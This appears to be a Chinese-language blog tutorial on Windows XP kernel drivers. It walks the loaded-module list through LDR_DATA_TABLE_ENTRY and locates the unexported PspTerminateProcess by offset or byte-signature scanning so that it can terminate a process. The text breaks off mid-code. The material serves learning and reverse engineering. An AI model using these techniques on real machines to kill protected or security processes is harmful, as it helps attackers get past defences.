<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; dt _LDR_DATA_TABLE_ENTRY</span><br><span class="line">ntdll!_LDR_DATA_TABLE_ENTRY</span><br><span class="line">   +<span class="number">0x000</span> InLoadOrderLinks : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x008</span> InMemoryOrderLinks : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x010</span> InInitializationOrderLinks : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x018</span> DllBase          : Ptr32 Void</span><br><span class="line">   +<span class="number">0x01c</span> EntryPoint       : Ptr32 Void</span><br><span class="line">   +<span class="number">0x020</span> SizeOfImage      : Uint4B</span><br><span class="line">   +<span class="number">0x024</span> FullDllName      : _UNICODE_STRING</span><br><span class="line">   +<span class="number">0x02c</span> BaseDllName      : _UNICODE_STRING</span><br><span class="line">   +<span class="number">0x034</span> Flags            : Uint4B</span><br><span class="line">   +<span class="number">0x038</span> LoadCount        : Uint2B</span><br><span class="line">   +<span class="number">0x03a</span> TlsIndex         : Uint2B</span><br><span class="line">   +<span class="number">0x03c</span> HashLinks        : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x03c</span> SectionPointer   : Ptr32 Void</span><br><span class="line">   +<span class="number">0x040</span> CheckSum         : Uint4B</span><br><span class="line">   +<span class="number">0x044</span> TimeDateStamp    : Uint4B</span><br><span class="line">   +<span class="number">0x044</span> LoadedImports    : Ptr32 Void</span><br><span class="line">   +<span class="number">0x048</span> EntryPointActivationContext : Ptr32 Void</span><br><span class="line">   +<span class="number">0x04c</span> PatchInformation : Ptr32 Void</span><br></pre></td></tr></table></figure>

<p>当前模块的DriverSection &#x3D; 0x863064b0，解析当前模块的<code>_LDR_DATA_TABLE_ENTRY</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LDR_DATA_TABLE_ENTRY</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">     LIST_ENTRY InLoadOrderLinks;</span><br><span class="line">     LIST_ENTRY InMemoryOrderLinks;</span><br><span class="line">     LIST_ENTRY InInitializationOrderLinks;</span><br><span class="line">     PVOID DllBase;</span><br><span class="line">     PVOID EntryPoint;</span><br><span class="line">     ULONG SizeOfImage;</span><br><span class="line">     UNICODE_STRING FullDllName;</span><br><span class="line">     UNICODE_STRING BaseDllName;</span><br><span class="line">     ULONG Flags;</span><br><span class="line">     WORD LoadCount;</span><br><span class="line">     WORD TlsIndex;</span><br><span class="line">     <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">     &#123;</span></span><br><span class="line">          LIST_ENTRY HashLinks;</span><br><span class="line">          <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">          &#123;</span></span><br><span class="line">               PVOID SectionPointer;</span><br><span class="line">               ULONG CheckSum;</span><br><span class="line">          &#125;;</span><br><span class="line">     &#125;;</span><br><span class="line">     <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">     &#123;</span></span><br><span class="line">          ULONG TimeDateStamp;</span><br><span class="line">          PVOID LoadedImports;</span><br><span class="line">     &#125;;</span><br><span class="line">     _ACTIVATION_CONTEXT * EntryPointActivationContext;</span><br><span class="line">     PVOID PatchInformation;</span><br><span class="line">     LIST_ENTRY ForwarderLinks;</span><br><span class="line">     LIST_ENTRY ServiceTagLinks;</span><br><span class="line">     LIST_ENTRY StaticLinks;</span><br><span class="line">&#125; LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; dt _LDR_DATA_TABLE_ENTRY <span class="number">0x863064b0</span></span><br><span class="line">ntdll!_LDR_DATA_TABLE_ENTRY</span><br><span class="line">   +<span class="number">0x000</span> InLoadOrderLinks : _LIST_ENTRY [ <span class="number">0x8055e720</span> - <span class="number">0x85d1fa88</span> ]</span><br><span class="line">   +<span class="number">0x008</span> InMemoryOrderLinks : _LIST_ENTRY [ <span class="number">0xffffffff</span> - <span class="number">0xffffffff</span> ]</span><br><span class="line">   +<span class="number">0x010</span> InInitializationOrderLinks : _LIST_ENTRY [ <span class="number">0x12</span> - <span class="number">0x0</span> ]</span><br><span class="line">   +<span class="number">0x018</span> DllBase          : <span class="number">0xf78a6000</span> Void</span><br><span class="line">   +<span class="number">0x01c</span> EntryPoint       : <span class="number">0xf78a7020</span> Void</span><br><span class="line">   +<span class="number">0x020</span> SizeOfImage      : <span class="number">0x6000</span></span><br><span class="line">   +<span class="number">0x024</span> FullDllName      : _UNICODE_STRING <span class="string">&quot;\??\C:\Documents and Settings\A1v1n\桌面\0115_2_输出参数PDRIVER_OBJECT.sys&quot;</span></span><br><span class="line">   +<span class="number">0x02c</span> BaseDllName      : _UNICODE_STRING <span class="string">&quot;0115_2_输出参数PDRIVER_OBJECT.sys&quot;</span></span><br><span class="line">   +<span class="number">0x034</span> Flags            : <span class="number">0x1104000</span></span><br><span class="line">   +<span class="number">0x038</span> LoadCount        : <span class="number">1</span></span><br><span class="line">   +<span class="number">0x03a</span> TlsIndex         : <span class="number">0x63</span></span><br><span class="line">   +<span class="number">0x03c</span> HashLinks        : _LIST_ENTRY [ <span class="number">0xffffffff</span> - <span class="number">0x2e30</span> ]</span><br><span class="line">   +<span class="number">0x03c</span> SectionPointer   : <span class="number">0xffffffff</span> Void</span><br><span class="line">   +<span class="number">0x040</span> CheckSum         : <span class="number">0x2e30</span></span><br><span class="line">   +<span class="number">0x044</span> TimeDateStamp    : <span class="number">0xfffffffe</span></span><br><span class="line">   +<span class="number">0x044</span> LoadedImports    : <span class="number">0xfffffffe</span> Void</span><br><span class="line">   +<span class="number">0x048</span> EntryPointActivationContext : (null) </span><br><span class="line">   +<span class="number">0x04c</span> PatchInformation : <span class="number">0x00310030</span> Void</span><br></pre></td></tr></table></figure>

<p>其中较重要的几个属性：</p>
<ul>
<li>InLoadOrderLinks：是个结构体，是个链表。有两个成员：Flink 和 Blink。。</li>
<li>DllBase：当前模块的基址</li>
<li>SizeOfImage：当前模块大小</li>
<li>FullDllName：完整的模块名，以<code>\??\</code>格式开始</li>
</ul>
<p>3环有点区别，<strong>在0环中InMemoryOrderLinks 和 InInitializationOrderLinks 是没用的</strong>，只需要关注第一个链表 InLoadOrderLinks。_LIST_ENTRY 这个结构体存了两个地址，指向前一个节点和下一个节点：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> &#123;</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> *<span class="title">Flink</span>;</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> *<span class="title">Blink</span>;</span></span><br><span class="line">&#125; LIST_ENTRY, *PLIST_ENTRY, *RESTRICTED_POINTER PRLIST_ENTRY;</span><br><span class="line"></span><br><span class="line">kd&gt; dt _LIST_ENTRY</span><br><span class="line">ntdll!_LIST_ENTRY</span><br><span class="line">   +<span class="number">0x000</span> Flink            : Ptr32 _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x004</span> Blink            : Ptr32 _LIST_ENTRY</span><br></pre></td></tr></table></figure>

<p>通过这个 InLoadOrderLinks，我们可以遍历整个高2G的模块了。<strong>InLoadOrderLinks.Flink 指向的就是下一个 _LDR_DATA_TABLE_ENTRY</strong>。下面给出遍历内核模块链表的代码：</p>
<blockquote>
<p><a href="https://zhidao.baidu.com/question/983263436191263299.html">网上说的比较常见的4种方法：</a></p>
<p>1、通过DriverEntry传入的DriverObject参数的DriverSection成员指向LDR_DATA_TABLE_ENTRY结构，通过遍历这张表得到ntoskrnl的基址和大小</p>
<p>2、ZwQuerySystemInformation大法</p>
<p>3、搜索内存 </p>
<p>4、利用KPCR结构</p>
</blockquote>
<p>则InLoadOrderLinks &#x3D; 0x863064b0，执行如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; dt _LIST_ENTRY <span class="number">0x863064b0</span></span><br><span class="line">ntdll!_LIST_ENTRY</span><br><span class="line"> [ <span class="number">0x8055e720</span> - <span class="number">0x85d1fa88</span> ]</span><br><span class="line">   +<span class="number">0x000</span> Flink            : <span class="number">0x8055e720</span> _LIST_ENTRY [ <span class="number">0x863fc3b0</span> - <span class="number">0x863064b0</span> ]</span><br><span class="line">   +<span class="number">0x004</span> Blink            : <span class="number">0x85d1fa88</span> _LIST_ENTRY [ <span class="number">0x863064b0</span> - <span class="number">0x85fa9e80</span> ]</span><br></pre></td></tr></table></figure>

<p>可知：</p>
<ul>
<li>0x8055e720：Flink，指向后一个_LDR_DATA_TABLE_ENTRY</li>
<li>0x85d1fa88：Blink，指向前一个_LDR_DATA_TABLE_ENTRY</li>
</ul>
<h3 id="1-5-练习：遍历内核中所有模块"><a href="#1-5-练习：遍历内核中所有模块" class="headerlink" title="1.5 练习：遍历内核中所有模块"></a>1.5 练习：遍历内核中所有模块</h3><p>宏CONTAINING_RECORD：返回一个结构体实例的基地址，该结构的类型和结构的一个成员地址已知。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">PCHAR  <span class="title">CONTAINING_RECORD</span><span class="params">( </span></span></span><br><span class="line"><span class="function"><span class="params">    IN PCHAR  Address, </span></span></span><br><span class="line"><span class="function"><span class="params">    IN TYPE  Type, </span></span></span><br><span class="line"><span class="function"><span class="params">    IN PCHAR  Field </span></span></span><br><span class="line"><span class="function"><span class="params">    )</span></span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>Address：指向当前结构体实例某成员的指针。</li>
<li>Type：结构体名称。</li>
<li>Field：结构体某个成员的名称。</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 卸载函数</span></span><br><span class="line"><span class="function">VOID <span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT driver)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DbgPrint(<span class="string">&quot;驱动程序停止运行了\n&quot;</span>);	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LDR_DATA_TABLE_ENTRY</span> &#123;</span></span><br><span class="line">    LIST_ENTRY InLoadOrderLinks;<span class="comment">//这个成员把系统所有加载(可能是停止没被卸载)已经读取到内存中,双链表</span></span><br><span class="line">    LIST_ENTRY InMemoryOrderLinks;<span class="comment">//系统已经启动,没有被初始化,没有调用DriverEntry这个历程的时候,通过这个链表进程串接起来</span></span><br><span class="line">    LIST_ENTRY InInitializationOrderLinks;<span class="comment">//已经调用DriverEntry这个函数的所有驱动程序</span></span><br><span class="line">    PVOID DllBase;</span><br><span class="line">    PVOID EntryPoint;<span class="comment">//驱动的进入点 DriverEntry</span></span><br><span class="line">    ULONG SizeOfImage;</span><br><span class="line">    UNICODE_STRING FullDllName;<span class="comment">//驱动的满路径</span></span><br><span class="line">    UNICODE_STRING BaseDllName;<span class="comment">//不带路径的驱动名字</span></span><br><span class="line">    ULONG Flags;</span><br><span class="line">    USHORT LoadCount;</span><br><span class="line">    USHORT TlsIndex;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        LIST_ENTRY HashLinks;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            PVOID SectionPointer;</span><br><span class="line">            ULONG CheckSum;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            ULONG TimeDateStamp;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            PVOID LoadedImports;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125; LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 入口函数，相当于main</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">( IN PDRIVER_OBJECT driver, IN PUNICODE_STRING reg_path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	PLDR_DATA_TABLE_ENTRY pLDR_Head = <span class="literal">NULL</span>;</span><br><span class="line">	PLDR_DATA_TABLE_ENTRY pLDR_Tail = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	pLDR_Head = (PLDR_DATA_TABLE_ENTRY)driver-&gt;DriverSection;</span><br><span class="line">	pLDR_Tail = pLDR_Head;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//pLDR_Blink = (PLDR_DATA_TABLE_ENTRY)CONTAINING_RECORD(pLDR_Flink,LDR_DATA_TABLE_ENTRY,InLoadOrderLinks);</span></span><br><span class="line">		DbgPrint(<span class="string">&quot;DllBase:%08X,SizeOfImage:%08X,FullDllName:%wZ\r\n&quot;</span>,pLDR_Tail-&gt;DllBase,pLDR_Tail-&gt;SizeOfImage,\</span><br><span class="line">		&amp;pLDR_Tail-&gt;FullDllName);</span><br><span class="line">		pLDR_Tail = (PLDR_DATA_TABLE_ENTRY)pLDR_Tail-&gt;InLoadOrderLinks.Flink;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span>(pLDR_Head != pLDR_Tail);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 设置一个卸载函数，便于退出</span></span><br><span class="line">	driver-&gt;DriverUnload = DriverUnload;</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意，Windbg 无法打印带中文的 UNICODE_STRING，建议把项目名取成全英文。</p>
<p><img data-src="https://s2.loli.net/2022/01/16/2NrEFpBSiAQW3bU.png" alt="13.png"></p>
<h2 id="2-未导出函数PspTerminateProcess"><a href="#2-未导出函数PspTerminateProcess" class="headerlink" title="2 未导出函数PspTerminateProcess"></a>2 未导出函数PspTerminateProcess</h2><p>PspTerminateProcess是0环的一个<strong>未导出函数</strong>，用来结束一个进程。函数PspTerminateProcess在ntoskerlpa.exe（2-9-9-12）中，是未导出函数，许多流氓软件无法关闭，就是因为HOOK了这个函数。</p>
<div class="note default"><p>从3环到0环的大概调用过程：TerminateProcess --&gt; ntdll.NtTerminateProcess(ntdll.ZwTerminateProcess) --&gt; PsTerminteProcess  --&gt;  PspTerminateProcess  --&gt; PspTerminateThreadByPointer  --&gt; KeInitializeApc&#x2F;KeInsertQueueApc(插入了一个核心态的APC调用，若是用户线程，会再插入用户态的APC调用，最终线程在自己的执行环境中) -&gt; PspExitThread。</p>
</div>

<p>在结束一个进程的过程中，可能有很多API会被HOOK。海哥说过，如果他HOOK 3环的API，你就HOOK 0环的API，比他更底层他就防不住你。但是越是底层，对用户的体验越不好，稍微操作不当就会蓝屏。</p>
<p>函数<code>PspTerminateProcess</code>定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS NTAPI <span class="title">PspTerminateProcess</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  	PEPROCESS Process,</span></span></span><br><span class="line"><span class="function"><span class="params">  	NTSTATUS ExitStatus</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>

<div class="note info"><p>其中第一个参数是PEPROCESS的指针，可以根据PID通过<strong>PsLookupProcessByProcessId</strong> 获得（头文件<code>ntifs.h</code>），而第二个参数指定退出状态码。可以用<a href="https://blog.csdn.net/hjxyshell/article/details/17312119">ZwQuerySystemInformation</a>通过进程名找PID。在驱动开发引入的<code>&lt;wdm.h&gt;</code>里提供了<code>MmGetSystemRoutineAddress</code>函数，根据函数名可以直接获取到<strong>已导出</strong>的函数地址。</p>
</div>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">PsLookupProcessByProcessId</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    IN HANDLE ProcessId,</span></span></span><br><span class="line"><span class="function"><span class="params">    OUT PEPROCESS *Process</span></span></span><br><span class="line"><span class="function"><span class="params">    )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS WINAPI <span class="title">ZwQuerySystemInformation</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,</span></span></span><br><span class="line"><span class="function"><span class="params">  _Inout_   PVOID                    SystemInformation,</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_      ULONG                    SystemInformationLength,</span></span></span><br><span class="line"><span class="function"><span class="params">  _Out_opt_ PULONG                   ReturnLength</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>

<div class="note danger"><p><code>PspTerminateProcess</code>是未导出函数，找未导出函数的几种思路：</p>
<ul>
<li>Windbg + .pdb（得到函数特征码）</li>
<li>特征码搜索，先得到函数所在模块的加载基址，然后遍历内存</li>
<li>A –&gt; B，A是导出函数，调用了B（未导出函数），通过A调用的地址来定位B</li>
<li>利用函数想对当前模块的偏移来定位函数：ImageBase+Offset</li>
</ul>
</div>

<h3 id="2-1-Windbg-pdb"><a href="#2-1-Windbg-pdb" class="headerlink" title="2.1 Windbg + .pdb"></a>2.1 Windbg + .pdb</h3><p>在有内核PDB的情况下，用Windbg可以直接找到该函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; u PspTerminateProcess L20</span><br><span class="line">nt!PspTerminateProcess:</span><br><span class="line"><span class="number">805</span>d3b18 <span class="number">8b</span>ff            mov     edi,edi</span><br><span class="line"><span class="number">805</span>d3b1a <span class="number">55</span>              push    ebp</span><br><span class="line"><span class="number">805</span>d3b1b <span class="number">8b</span>ec            mov     ebp,esp</span><br><span class="line"><span class="number">805</span>d3b1d <span class="number">56</span>              push    esi</span><br><span class="line"><span class="number">805</span>d3b1e <span class="number">64</span>a124010000    mov     eax,dword ptr fs:[<span class="number">00000124</span>h]</span><br><span class="line"><span class="number">805</span>d3b24 <span class="number">8b</span>7508          mov     esi,dword ptr [ebp+<span class="number">8</span>]</span><br><span class="line"><span class="number">805</span>d3b27 <span class="number">3b</span>7044          cmp     esi,dword ptr [eax+<span class="number">44</span>h]</span><br><span class="line"><span class="number">805</span>d3b2a <span class="number">7507</span>            jne     nt!PspTerminateProcess+<span class="number">0x1b</span> (<span class="number">805</span>d3b33)</span><br><span class="line"><span class="number">805</span>d3b2c b80d0000c0      mov     eax,<span class="number">0</span>C000000Dh</span><br><span class="line"><span class="number">805</span>d3b31 eb5a            jmp     nt!PspTerminateProcess+<span class="number">0x75</span> (<span class="number">805</span>d3b8d)</span><br><span class="line"><span class="number">805</span>d3b33 <span class="number">57</span>              push    edi</span><br><span class="line"><span class="number">805</span>d3b34 <span class="number">8</span>dbe48020000    lea     edi,[esi+<span class="number">248</span>h]</span><br><span class="line"><span class="number">805</span>d3b3a f6470120        test    byte ptr [edi+<span class="number">1</span>],<span class="number">20</span>h</span><br><span class="line"><span class="number">805</span>d3b3e <span class="number">7412</span>            je      nt!PspTerminateProcess+<span class="number">0x3a</span> (<span class="number">805</span>d3b52)</span><br><span class="line"><span class="number">805</span>d3b40 <span class="number">8</span>d8674010000    lea     eax,[esi+<span class="number">174</span>h]</span><br><span class="line"><span class="number">805</span>d3b46 <span class="number">50</span>              push    eax</span><br><span class="line"><span class="number">805</span>d3b47 <span class="number">56</span>              push    esi</span><br><span class="line"><span class="number">805</span>d3b48 <span class="number">68</span>ea3a5d80      push    offset nt!NtTerminateProcess+<span class="number">0x14c</span> (<span class="number">805</span>d3aea)</span><br><span class="line"><span class="number">805</span>d3b4d e8f2eeffff      call    nt!PspCatchCriticalBreak (<span class="number">805</span>d2a44)</span><br><span class="line"><span class="number">805</span>d3b52 <span class="number">6</span>a08            push    <span class="number">8</span></span><br><span class="line"><span class="number">805</span>d3b54 <span class="number">58</span>              pop     eax</span><br><span class="line"><span class="number">805</span>d3b55 f00907          lock <span class="keyword">or</span> dword ptr [edi],eax</span><br><span class="line"><span class="number">805</span>d3b58 <span class="number">6</span>a00            push    <span class="number">0</span></span><br><span class="line"><span class="number">805</span>d3b5a <span class="number">56</span>              push    esi</span><br><span class="line"><span class="number">805</span>d3b5b e8784f0000      call    nt!PsGetNextProcessThread (<span class="number">805</span>d8ad8)</span><br><span class="line"><span class="number">805</span>d3b60 <span class="number">8b</span>f8            mov     edi,eax</span><br><span class="line"><span class="number">805</span>d3b62 <span class="number">85f</span>f            test    edi,edi</span><br><span class="line"><span class="number">805</span>d3b64 <span class="number">741</span>e            je      nt!PspTerminateProcess+<span class="number">0x6c</span> (<span class="number">805</span>d3b84)</span><br><span class="line"><span class="number">805</span>d3b66 ff750c          push    dword ptr [ebp+<span class="number">0</span>Ch]</span><br><span class="line"><span class="number">805</span>d3b69 <span class="number">57</span>              push    edi</span><br><span class="line"><span class="number">805</span>d3b6a e807fdffff      call    nt!PspTerminateThreadByPointer (<span class="number">805</span>d3876)</span><br><span class="line"><span class="number">805</span>d3b6f <span class="number">57</span>              push    edi</span><br></pre></td></tr></table></figure>

<p>0x805d3b18 就是函数头，然而这个值由于重定位，可能会变的，所以我们就要用其他办法，确保每次都能找到这个函数。</p>
<h3 id="2-2-通过已导出函数"><a href="#2-2-通过已导出函数" class="headerlink" title="2.2 通过已导出函数"></a>2.2 通过已导出函数</h3><p>第二种办法是根据已导出函数找未导出函数，在驱动开发引入的<code>&lt;wdm.h&gt;</code>里提供了<code>MmGetSystemRoutineAddress</code>函数，根据函数名可以直接获取到<strong>已导出</strong>的函数地址。</p>
<ol>
<li><p>在IDA中任意找一个导出函数的地址：ZwQueryInformationProcess：0x00429934。</p>
<p><img data-src="https://s2.loli.net/2022/01/16/ng1pLzJZrvyM8sN.png" alt="14.png"></p>
</li>
<li><p>在Windbg中获取该函数的地址：0x80501934。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; u ZwQueryInformationProcess</span><br><span class="line">nt!ZwQueryInformationProcess:</span><br><span class="line"><span class="number">80501934</span> b89a000000      mov     eax,<span class="number">9</span>Ah</span><br><span class="line"><span class="number">80501939</span> <span class="number">8</span>d542404        lea     edx,[esp+<span class="number">4</span>]</span><br><span class="line"><span class="number">8050193</span>d <span class="number">9</span>c              pushfd</span><br><span class="line"><span class="number">8050193</span>e <span class="number">6</span>a08            push    <span class="number">8</span></span><br><span class="line"><span class="number">80501940</span> e80c0b0400      call    nt!KiSystemService (<span class="number">80542451</span>)</span><br><span class="line"><span class="number">80501945</span> c21400          ret     <span class="number">14</span>h</span><br></pre></td></tr></table></figure>
</li>
<li><p>函数PspTerminateProcess在Windbg的地址：0x805d3b18。则0x805d3b18 - (0x80501934 - 0x00429934) &#x3D; 0x004FBB18。</p>
</li>
<li><p>在IDA中按<code>G</code>输入0x004FBB18定位到代码段：（<em>该方法如果<code>ntoskerlpa.exe</code>重定位了就无法使用了</em>）</p>
<p><img data-src="https://s2.loli.net/2022/01/16/I4CUNzWPLTVsog9.png" alt="15.png"></p>
</li>
<li><p>在IDA，鼠标定位到该函数，View - Open subviews - Cross reference 查看该函数的交叉引用情况。</p>
<p><img data-src="https://s2.loli.net/2022/01/16/NpbWX9M4nTzHvGA.png" alt="16.png"></p>
</li>
</ol>
<p>可以看到A函数没有一个是导出函数，故该方法不适用。</p>
<h3 id="2-3-模块基址-偏移"><a href="#2-3-模块基址-偏移" class="headerlink" title="2.3 模块基址+偏移"></a>2.3 模块基址+偏移</h3><p>虽然模块基址会变，但是函数相对基址的偏移是不变的，通过这个规律也可以找到想要的函数。<br>PspTerminateProcess 相对内核基址的偏移 &#x3D; 0x805d3b18 - (0x80501934 - 0x00429934)  &#x3D; 0x004FBB18<br>只要找到内核基址，加上 0x004FBB18 就是 PspTerminateProcess 的地址。</p>
<p>这种方法我就不贴代码了，因为原理比较简单。</p>
<h3 id="2-4-特征码匹配（最常用）"><a href="#2-4-特征码匹配（最常用）" class="headerlink" title="2.4 特征码匹配（最常用）"></a>2.4 特征码匹配（最常用）</h3><div class="note warning"><p>提取特征码（硬编码）注意几个问题：</p>
<ul>
<li>绕开所有函数都有的指令。如PUSH EBP；MOV EBP，ESP等对应的硬编码</li>
<li>然开全局变量等和重定位有关的指令，该模块下次加载地址会变</li>
<li>要提取代码中特征明显，功能很小众的代码</li>
<li>最好跳着提特征码：8b 75 08 3b 70 44 ?? ?? ?? ?? 68 20 d5 62 80 ?? ?? ?? ?? 68 20</li>
</ul>
</div>

<h3 id="2-5-练习：使用PspTerminateProcess关闭记事本"><a href="#2-5-练习：使用PspTerminateProcess关闭记事本" class="headerlink" title="2.5 练习：使用PspTerminateProcess关闭记事本"></a>2.5 练习：使用PspTerminateProcess关闭记事本</h3><p>大致流程如下：</p>
<ol>
<li>先获取函数特征码。</li>
<li>确定函数所在的内核模块，通过内核模块遍历获取<code>ntoskerlpa.exe</code>模块的基址和大小（使用到<code>PDRIVER_OBJECT</code>）。</li>
<li>到指定模块中，根据特征码按字节比对，确定函数<code>PspTerminateProcess</code>的地址。</li>
<li>通过函数指针，关闭指定进程。</li>
</ol>
<p>选取函数一段特征码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">805</span>d3b1e <span class="number">64</span>a124010000    mov     eax,dword ptr fs:[<span class="number">00000124</span>h]</span><br><span class="line"><span class="number">805</span>d3b24 <span class="number">8b</span>7508          mov     esi,dword ptr [ebp+<span class="number">8</span>]</span><br><span class="line"><span class="number">805</span>d3b27 <span class="number">3b</span>7044          cmp     esi,dword ptr [eax+<span class="number">44</span>h]</span><br><span class="line"><span class="number">805</span>d3b2a <span class="number">7507</span>            jne     nt!PspTerminateProcess+<span class="number">0x1b</span> (<span class="number">805</span>d3b33)</span><br><span class="line"><span class="number">805</span>d3b2c b80d0000c0      mov     eax,<span class="number">0</span>C000000Dh</span><br><span class="line"><span class="number">805</span>d3b31 eb5a            jmp     nt!PspTerminateProcess+<span class="number">0x75</span> (<span class="number">805</span>d3b8d)</span><br><span class="line"><span class="number">805</span>d3b33 <span class="number">57</span>              push    edi</span><br><span class="line"><span class="number">805</span>d3b34 <span class="number">8</span>dbe48020000    lea     edi,[esi+<span class="number">248</span>h]</span><br><span class="line"><span class="number">805</span>d3b3a f6470120        test    byte ptr [edi+<span class="number">1</span>],<span class="number">20</span>h</span><br><span class="line"><span class="number">805</span>d3b3e <span class="number">7412</span>            je      nt!PspTerminateProcess+<span class="number">0x3a</span> (<span class="number">805</span>d3b52)</span><br><span class="line"><span class="number">805</span>d3b40 <span class="number">8</span>d8674010000    lea     eax,[esi+<span class="number">174</span>h]</span><br></pre></td></tr></table></figure>

<p>特征码搜索，先得到函数所在模块（ntoskerlpa.exe）的加载基址，然后遍历内存。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"><span class="comment">//#include &lt;ntifs.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="function">ULONG <span class="title">GetKernelMoudleInfo</span><span class="params">(IN PDRIVER_OBJECT pDriver,OUT PVOID* DllBase,OUT PULONG SizeOfImage)</span></span>;</span><br><span class="line"><span class="function">PVOID <span class="title">Find_FeatureCode</span><span class="params">(PVOID pShellCode,ULONG ulShellCode_Len,PVOID DllBase,ULONG ulSizeOfImage)</span></span>;</span><br><span class="line"><span class="comment">// 卸载函数</span></span><br><span class="line"><span class="function">VOID <span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT driver)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DbgPrint(<span class="string">&quot;驱动程序停止运行了\r\n&quot;</span>);	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LDR_DATA_TABLE_ENTRY</span> &#123;</span></span><br><span class="line">    LIST_ENTRY InLoadOrderLinks;<span class="comment">//这个成员把系统所有加载(可能是停止没被卸载)已经读取到内存中,双链表</span></span><br><span class="line">    LIST_ENTRY InMemoryOrderLinks;<span class="comment">//系统已经启动,没有被初始化,没有调用DriverEntry这个历程的时候,通过这个链表进程串接起来</span></span><br><span class="line">    LIST_ENTRY InInitializationOrderLinks;<span class="comment">//已经调用DriverEntry这个函数的所有驱动程序</span></span><br><span class="line">    PVOID DllBase;</span><br><span class="line">    PVOID EntryPoint;<span class="comment">//驱动的进入点 DriverEntry</span></span><br><span class="line">    ULONG SizeOfImage;</span><br><span class="line">    UNICODE_STRING FullDllName;<span class="comment">//驱动的满路径</span></span><br><span class="line">    UNICODE_STRING BaseDllName;<span class="comment">//不带路径的驱动名字</span></span><br><span class="line">    ULONG Flags;</span><br><span class="line">    USHORT LoadCount;</span><br><span class="line">    USHORT TlsIndex;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        LIST_ENTRY HashLinks;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            PVOID SectionPointer;</span><br><span class="line">            ULONG CheckSum;</span><br><span class="line">        